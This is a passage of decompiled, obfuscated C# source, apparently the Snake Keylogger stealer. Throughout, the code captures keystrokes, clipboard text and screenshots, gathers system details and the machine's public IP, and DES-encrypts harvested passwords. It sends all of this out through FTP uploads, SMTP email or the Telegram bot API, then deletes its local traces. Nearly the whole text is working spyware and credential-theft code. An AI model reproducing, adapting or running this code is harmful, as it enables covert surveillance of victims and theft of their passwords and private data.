			webClient.UploadData(Ӛױ_FFFD츠Ԝ, "POST", bytes);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private static void mmבɩ_FFFD(byte[] ŧΑŔс_FFFD, string _0026_FFFDŔҭ_FFFD, string Ң䕃Wأ߂, string _FFFD_02F3_FFFD_06E8_FFFD)
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
			webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
			string @string = webClient.Encoding.GetString(ŧΑŔс_FFFD);
			string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", text, _0026_FFFDŔҭ_FFFD, Ң䕃Wأ߂, @string);
			byte[] bytes = webClient.Encoding.GetBytes(s);
			webClient.UploadData(_FFFD_02F3_FFFD_06E8_FFFD, "POST", bytes);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void _05B5şζÒå(string ԜҢ_DB8E_DC0Bꓞ, string O_061C_FFFD_065A_FFFD, string ٵΩ_06E3O_FFFD)
	{
		try
		{
			string requestUriString = "https://api.telegram.org/bot" + ԜҢ_DB8E_DC0Bꓞ + "/sendMessage?chat_id=" + O_061C_FFFD_065A_FFFD + "&text=" + ٵΩ_06E3O_FFFD;
			ServicePointManager.Expect100Continue = false;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			string empty = string.Empty;
			try
			{
				WebResponse response = httpWebRequest.GetResponse();
				using Stream stream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(stream, Encoding.UTF8);
				streamReader.ReadToEnd();
			}
			catch (WebException ex)
			{
				ProjectData.SetProjectError((Exception)ex);
				WebException ex2 = ex;
				empty = ex2.Message.ToString();
				WebResponse response2 = ex2.Response;
				using (Stream stream2 = response2.GetResponseStream())
				{
					StreamReader streamReader2 = new StreamReader(stream2, Encoding.GetEncoding("utf-8"));
					string text = streamReader2.ReadToEnd();
				}
				throw;
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
	}

	public static string 盀Ŵ恁ݶ恁(string c_FFFD㹃ϱ_FFFD, string ήƜŧj_FFFD)
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[8];
		Array.Copy(mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(ήƜŧj_FFFD)), 0, array, 0, 8);
		dESCryptoServiceProvider.Key = array;
		dESCryptoServiceProvider.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = dESCryptoServiceProvider.CreateEncryptor();
		byte[] bytes = Encoding.ASCII.GetBytes(c_FFFD㹃ϱ_FFFD);
		return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
	}

	public static object Ȩ_FFFDή_0332Ŵ()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		checked
		{
			long num = default(long);
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.IsReady)
				{
					num += driveInfo.TotalSize;
				}
			}
			num = (long)Math.Round((double)num / 1048576.0 / 1024.0);
			return Conversions.ToString(num) + " GB";
		}
	}

	public static object _26CA_FFFDی똛丐()
	{
		return Conversions.ToString(DateAndTime.get_Today()) + " / " + Conversions.ToString(DateAndTime.get_TimeOfDay());
	}

	public static object בϒ_00BEŧ_FFFD()
	{
		return ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Info().get_OSFullName();
	}

	public static object ãמԹ_1CFC_FFFD()
	{
		return ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Info().get_OSVersion();
	}

	public static object ʭ뜸_00ABЦꓞ()
	{
		double num = 1073741824.0;
		double num2 = (double)((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Info().get_TotalPhysicalMemory() / num;
		return $"{num2:f2} GB";
	}

	public static object ŧ_FFFD_07B4c_0040()
	{
		WebClient webClient = new WebClient();
		webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)");
		string address = "http://checkip.dyndns.org/";
		IWebProxy systemWebProxy = WebRequest.GetSystemWebProxy();
		systemWebProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
		webClient.Proxy = systemWebProxy;
		Stream stream = default(Stream);
		try
		{
			stream = webClient.OpenRead(address);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		StreamReader streamReader = new StreamReader(stream);
		string text = streamReader.ReadToEnd();
		stream.Close();
		streamReader.Close();
		text = text.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").Replace("Current IP Address: ", "")
			.ToString();
		return "Client IP: " + text;
	}

	public static byte[] mչ丐ŧ꾯()
	{
		string s = "Clipboard | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n\r\n\r\n" + Ӻꓞ㹃Ң_003B + "\r\n\r\n--------------------------------------------------";
		return Encoding.Unicode.GetBytes(s);
	}

	public static void _FFFD_061DɢܣԜ(object _005EéK_FFFDĂ, EventArgs _02F3ӓӥ_DB27_DD16)
	{
		if (!Ӻꓞ㹃Ң_003B.ToString().Contains(((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Clipboard().GetText().Replace(".", "<.>")
			.Replace("http", "<http>")))
		{
			Ӻꓞ㹃Ң_003B = Ӻꓞ㹃Ң_003B + ((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Clipboard().GetText().Replace(".", "<.>")
				.Replace("http", "<http>") + "\r\n";
		}
	}

	public static void _FFFDϱ鈇ĪУ(object _05B4ŧ_FFFDƉ_2964, EventArgs 鈇_05C9_0385鈇_F0B9)
	{
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "%FTPDV$", false) == 0)
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)NewLateBinding.LateGet((object)null, typeof(WebRequest), "Create", new object[1] { Operators.AddObject(Operators.AddObject((object)(_06E8_FFFDtߟ_05B5 + ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Name() + " - Clipboard Logs ID - "), _0306_0306j_0739_07B9), (object)_FFFD蠺_0026_0089ҡ) }, (string[])null, (Type[])null, (bool[])null);
			try
			{
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(ӛ_FFFD_FFFD_05C9_06DA, 恁_FFFDʪ_FFFD_FFFD);
				byte[] bytes = Encoding.UTF8.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n\r\n\r\n" + Ӻꓞ㹃Ң_003B + "\r\n\r\n--------------------------------------------------");
				ftpWebRequest.ContentLength = bytes.Length;
				using Stream stream = ftpWebRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%SMTPDV$", false) == 0)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(_1CFCʤmåӓ);
				mailMessage.To.Add(_0089ҟߟ_06DA_2964);
				mailMessage.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
				mailMessage.Body = "Clipboard | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n\r\n";
				byte[] buffer = mչ丐ŧ꾯();
				MemoryStream contentStream = new MemoryStream(buffer);
				mailMessage.Attachments.Add(new Attachment(contentStream, "Clipboard" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				SmtpClient smtpClient = new SmtpClient(_DA6A_DC9A_FFFDƚȨ);
				if (Operators.CompareString(ݝاמЮҟ, "True", false) == 0)
				{
					smtpClient.EnableSsl = true;
				}
				else
				{
					smtpClient.EnableSsl = false;
				}
				smtpClient.Port = Conversions.ToInteger(_0300_0333_FFFD_FFFD_0097);
				smtpClient.Credentials = new NetworkCredential(_1CFCʤmåӓ, Ɯ_00ABεų_FFFD);
				smtpClient.Send(mailMessage);
				mailMessage.Dispose();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%TelegramDv$", false) == 0)
		{
			try
			{
				string text = "Clipboard | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n\r\n\r\n" + Ӻꓞ㹃Ң_003B + "\r\n\r\n--------------------------------------------------";
				ServicePointManager.Expect100Continue = false;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				string ω_FFFDٷi_FFFD = string.Concat("https://api.telegram.org/bot", _003B_005EŁ_00BEҡ, "/sendDocument?chat_id=", ņ_07A8Ѕ_0300ʪ, "&caption=", " Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nClipboard | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
				ϫ_05C3_002DݝӺ("Clipboard" + _FFFD蠺_0026_0089ҡ, "application/x-ms-dos-executable", ω_FFFDٷi_FFFD, text);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void 嵱_FFFDR_FFFDأ(object ٵݶ_07A8_061Cٵ, EventArgs 䇹_07FB_0332ľK)
	{
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0183: Expected O, but got Unknown
		string text = "Screenshot";
		string text2 = ".png";
		string path = ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\SnakeKeylogger";
		try
		{
			if (Directory.Exists(path))
			{
				ӺԜ_05B5鈟ꓞ = ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\SnakeKeylogger\\" + text + text2;
				Size size = new Size(((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Screen().get_Bounds().Width, ((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Screen().get_Bounds().Height);
				Bitmap val = new Bitmap(((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Screen().get_Bounds().Width, ((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Screen().get_Bounds().Height);
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				val2.CopyFromScreen(new Point(0, 0), new Point(0, 0), size);
				((Image)val).Save(ӺԜ_05B5鈟ꓞ);
				恁ᔖ_FFFDşݝ();
				ŲŎ_0089_00ABӺ();
			}
			else
			{
				Directory.CreateDirectory(path);
				Size size2 = new Size(((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Screen().get_Bounds().Width, ((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Screen().get_Bounds().Height);
				Bitmap val3 = new Bitmap(((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Screen().get_Bounds().Width, ((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Screen().get_Bounds().Height);
				Graphics val4 = Graphics.FromImage((Image)(object)val3);
				val4.CopyFromScreen(new Point(0, 0), new Point(0, 0), size2);
				((Image)val3).Save(ӺԜ_05B5鈟ꓞ);
				恁ᔖ_FFFDşݝ();
				ŲŎ_0089_00ABӺ();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void 恁ᔖ_FFFDşݝ()
	{
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "%FTPDV$", false) == 0)
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)NewLateBinding.LateGet((object)null, typeof(WebRequest), "Create", new object[1] { Operators.AddObject(Operators.AddObject((object)(_06E8_FFFDtߟ_05B5 + ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Name() + " - Screenshot Logs ID - "), _0306_0306j_0739_07B9), (object)".png") }, (string[])null, (Type[])null, (bool[])null);
			try
			{
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(ӛ_FFFD_FFFD_05C9_06DA, 恁_FFFDʪ_FFFD_FFFD);
				byte[] array = File.ReadAllBytes(ӺԜ_05B5鈟ꓞ);
				ftpWebRequest.ContentLength = array.Length;
				using Stream stream = ftpWebRequest.GetRequestStream();
				stream.Write(array, 0, array.Length);
				stream.Close();
				File.Delete(ӺԜ_05B5鈟ꓞ);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%SMTPDV$", false) == 0)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(_1CFCʤmåӓ);
				mailMessage.To.Add(_0089ҟߟ_06DA_2964);
				mailMessage.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
				mailMessage.Body = "Screenshot | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n\r\n";
				Attachment item = new Attachment(ӺԜ_05B5鈟ꓞ);
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient(_DA6A_DC9A_FFFDƚȨ);
				if (Operators.CompareString(ݝاמЮҟ, "True", false) == 0)
				{
					smtpClient.EnableSsl = true;
				}
				else
				{
					smtpClient.EnableSsl = false;
				}
				smtpClient.Port = Conversions.ToInteger(_0300_0333_FFFD_FFFD_0097);
				smtpClient.Credentials = new NetworkCredential(_1CFCʤmåӓ, Ɯ_00ABεų_FFFD);
				smtpClient.Send(mailMessage);
				mailMessage.Dispose();
				ŲŎ_0089_00ABӺ();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%TelegramDv$", false) == 0)
		{
			try
			{
				byte[] ŧΑŔс_FFFD = File.ReadAllBytes(ӺԜ_05B5鈟ꓞ);
				ServicePointManager.Expect100Continue = false;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				string text = string.Concat("https://api.telegram.org/bot", _003B_005EŁ_00BEҡ, "/sendDocument?chat_id=", ņ_07A8Ѕ_0300ʪ, "&caption=", " Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nScreenshot | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n\r\n");
				mmבɩ_FFFD(ŧΑŔс_FFFD, ӺԜ_05B5鈟ꓞ, "application/x-ms-dos-executable", text);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void ŲŎ_0089_00ABӺ()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		string path = default(string);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					path = ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\SnakeKeylogger";
					goto IL_0023;
				case 112:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0023;
						case 3:
							goto IL_002c;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0023:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_002c;
					IL_002c:
					num = 3;
					if (!Directory.Exists(path))
					{
						goto end_IL_0001_3;
					}
					break;
					end_IL_0001_2:
					break;
				}
				num = 4;
				Directory.Delete(path, recursive: true);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 112;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] Ѕ_0655_FFFD뜸ݶ()
	{
		string s = "KP | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n\r\n\r\n" + _FFFDŁԜӓŚ.ToString() + "\r\n\r\n\r\n--------------------------------------------------";
		return Encoding.Unicode.GetBytes(s);
	}

	private static void 恁_005Eľœ_07B8(object _0609չӤ盀ߡ, EventArgs Ɵاŧ2m)
	{
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "%FTPDV$", false) == 0)
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)NewLateBinding.LateGet((object)null, typeof(WebRequest), "Create", new object[1] { Operators.AddObject(Operators.AddObject((object)(_06E8_FFFDtߟ_05B5 + ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Name() + " - keystroke Logs ID - "), _0306_0306j_0739_07B9), (object)_FFFD蠺_0026_0089ҡ) }, (string[])null, (Type[])null, (bool[])null);
			try
			{
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(ӛ_FFFD_FFFD_05C9_06DA, 恁_FFFDʪ_FFFD_FFFD);
				byte[] bytes = Encoding.UTF8.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n\r\n\r\n" + _FFFDŁԜӓŚ.ToString() + "\r\n\r\n\r\n--------------------------------------------------");
				ftpWebRequest.ContentLength = bytes.Length;
				using Stream stream = ftpWebRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				ߡU_07B8ʤş = "";
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%SMTPDV$", false) == 0)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(_1CFCʤmåӓ);
				mailMessage.To.Add(_0089ҟߟ_06DA_2964);
				mailMessage.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
				byte[] buffer = Ѕ_0655_FFFD뜸ݶ();
				MemoryStream contentStream = new MemoryStream(buffer);
				mailMessage.Attachments.Add(new Attachment(contentStream, "Keystrokes" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				mailMessage.Body = "KP | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
				SmtpClient smtpClient = new SmtpClient(_DA6A_DC9A_FFFDƚȨ);
				if (Operators.CompareString(ݝاמЮҟ, "True", false) == 0)
				{
					smtpClient.EnableSsl = true;
				}
				else
				{
					smtpClient.EnableSsl = false;
				}
				smtpClient.Port = Conversions.ToInteger(_0300_0333_FFFD_FFFD_0097);
				smtpClient.Credentials = new NetworkCredential(_1CFCʤmåӓ, Ɯ_00ABεų_FFFD);
				smtpClient.Send(mailMessage);
				mailMessage.Dispose();
				ߡU_07B8ʤş = "";
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%TelegramDv$", false) == 0)
		{
			try
			{
				string text = "Keylogger | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n\r\n\r\n" + _FFFDŁԜӓŚ.ToString() + "\r\n\r\n\r\n--------------------------------------------------";
				ServicePointManager.Expect100Continue = false;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				string ω_FFFDٷi_FFFD = string.Concat("https://api.telegram.org/bot", _003B_005EŁ_00BEҡ, "/sendDocument?chat_id=", ņ_07A8Ѕ_0300ʪ, "&caption=", " Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nKeylogger | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
				ϫ_05C3_002DݝӺ("SnakeKeylogger" + _FFFD蠺_0026_0089ҡ, "application/x-ms-dos-executable", ω_FFFDٷi_FFFD, text);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void Ӥē_0385_060CΑ(object Уޗ_FFFD㠰_07A8, KeyLoggerEventArgs tсЮչm)
	{
		if (Operators.CompareString(_FFFDҢk_FFFDˤ, _2_FFFDՕ_FFFDņ.CurrentWindow, false) != 0)
		{
			_FFFDҢk_FFFDˤ = _2_FFFDՕ_FFFDņ.CurrentWindow;
			ô䇹_065Aę鈇($"\r\n[ -- {_2_FFFDՕ_FFFDņ.CurrentWindow} -- ]\r\n");
		}
		ô䇹_065Aę鈇($"{tсЮչm.StringValue}");
	}

	private static void 콪_FFFD_FFFDΩŔ(object _2_0609_02E8_FFFDO, KeyLoggerEventArgs ëǎŚ_07B4_FFFD)
	{
		ô䇹_065Aę鈇($"{ëǎŚ_07B4_FFFD.StringValue}");
	}

	private static void ô䇹_065Aę鈇(string ƚk_032EŴ䕃)
	{
		_FFFDŁԜӓŚ.Append(ƚk_032EŴ䕃);
	}

	[DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
	public static extern IntPtr å_FFFDЮ_FFFDɛ();

	[DllImport("user32.dll", EntryPoint = "GetWindowText")]
	public static extern int _FFFDǎЅ_FFFDհ(IntPtr _058Fɮٵŧ_FFFD, StringBuilder _FFFD㠰BіŎ, int _FFFDå_FFFDΑ恁);

	[DllImport("ntdll.dll", EntryPoint = "Wekakekakd", SetLastError = true)]
	public static extern int ٷZЅA㠰(IntPtr _FFFD_06DA_05C3ôҏ, int ľ_FFFD_05B4_FFFD_0657, ref int _FFFD_07BBсJ_002D, int _FFFDԜ_FFFDߟå);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowThreadProcessId", ExactSpelling = true, SetLastError = true)]
	public static extern int _07FB_FFFDҚ_06E3_FFFD(IntPtr AεŲ_002DJ, ref int _FFFDĪӛ_2964ک);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetKeyboardLayout", ExactSpelling = true, SetLastError = true)]
	public static extern int ãęŚή㠰(int ҟӚ_FFFDӤϘ);

	[DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
	public static extern int _FFFD_1CFC_FFFDKj(uint ӛʪ䕃œУ, uint ɛϘԹ_0327ҏ, byte[] לЅ_FFFDᔖÒ, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder ЦՕک_FFFD_0385, int Юҡ뫆_FFFDR, uint _00AB_FFFDջӥ_07B8, IntPtr _061Cіߟ_FFFD_058F);

	[DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
	public static extern bool 쐬מ_00AB蠺븤(byte[] _05B5ᔖ츠_FFFDŴ);

	[DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
	public static extern uint _061D蠺сiȨ(uint _FFFD_07A8Ŏ_FFFD_FFFD, uint _߂_00ABі_0655_07A8);

	private static void 츠_FFFD_FFFDՕՕ()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			_2_FFFDՕ_FFFDņ = new KeyLogger();
			_2_FFFDՕ_FFFDņ.KeyDown += Ӥē_0385_060CΑ;
			_2_FFFDՕ_FFFDņ.KeyUp += 콪_FFFD_FFFDΩŔ;
			Application.Run();
		});
		thread.Start();
	}

	public static byte[] Z_0040_FFFD㠰Ŵ()
	{
		string s = 盀Ŵ恁ݶ恁("PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ӛ_FFFDzmϒ);
		return Encoding.Unicode.GetBytes(s);
	}

	public static byte[] ή_002DΑ_F0B9_0331()
	{
		string s = 盀Ŵ恁ݶ恁("PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ӛ_FFFDzmϒ);
		return Encoding.Default.GetBytes(s);
	}

	private static void Z_060Cņē_FFFD(object _FFFDņήéג, EventArgs ʤҟ_FFFDޗ_FFFD)
	{
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "%FTPDV$", false) == 0)
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)NewLateBinding.LateGet((object)null, typeof(WebRequest), "Create", new object[1] { Operators.AddObject(Operators.AddObject((object)(_06E8_FFFDtߟ_05B5 + ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Name() + " - Passwords ID - "), _0306_0306j_0739_07B9), (object)_FFFD蠺_0026_0089ҡ) }, (string[])null, (Type[])null, (bool[])null);
			try
			{
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(ӛ_FFFD_FFFD_05C9_06DA, 恁_FFFDʪ_FFFD_FFFD);
				byte[] bytes = Encoding.UTF8.GetBytes(盀Ŵ恁ݶ恁("PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ӛ_FFFDzmϒ));
				ftpWebRequest.ContentLength = bytes.Length;
				using Stream stream = ftpWebRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%SMTPDV$", false) == 0)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(_1CFCʤmåӓ);
				mailMessage.To.Add(_0089ҟߟ_06DA_2964);
				mailMessage.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
				mailMessage.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
				byte[] buffer = Z_0040_FFFD㠰Ŵ();
				byte[] buffer2 = ή_002DΑ_F0B9_0331();
				MemoryStream contentStream = new MemoryStream(buffer);
				MemoryStream contentStream2 = new MemoryStream(buffer2);
				mailMessage.Attachments.Add(new Attachment(contentStream, "Passwords" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				mailMessage.Attachments.Add(new Attachment(contentStream2, "User" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				SmtpClient smtpClient = new SmtpClient(_DA6A_DC9A_FFFDƚȨ);
				if (Operators.CompareString(ݝاמЮҟ, "True", false) == 0)
				{
					smtpClient.EnableSsl = true;
				}
				else
				{
					smtpClient.EnableSsl = false;
				}
				smtpClient.Port = Conversions.ToInteger(_0300_0333_FFFD_FFFD_0097);
				smtpClient.Credentials = new NetworkCredential(_1CFCʤmåӓ, Ɯ_00ABεų_FFFD);
				smtpClient.Send(mailMessage);
				mailMessage.Dispose();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%TelegramDv$", false) == 0)
		{
			try
			{
				string 嵱Ң_FFFD_FFFD㹃 = 盀Ŵ恁ݶ恁("PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ӛ_FFFDzmϒ);
				ServicePointManager.Expect100Continue = false;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				string ӛױ_FFFD츠Ԝ = string.Concat("https://api.telegram.org/bot", _003B_005EŁ_00BEҡ, "/sendDocument?chat_id=", ņ_07A8Ѕ_0300ʪ, "&caption=", " Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
				Ŕ_FFFDҢ꾯_02F3("SnakePW" + _FFFD蠺_0026_0089ҡ, "application/x-ms-dos-executable", ӛױ_FFFD츠Ԝ, 嵱Ң_FFFD_FFFD㹃);
			}
			catch (Exception ex5)
			{
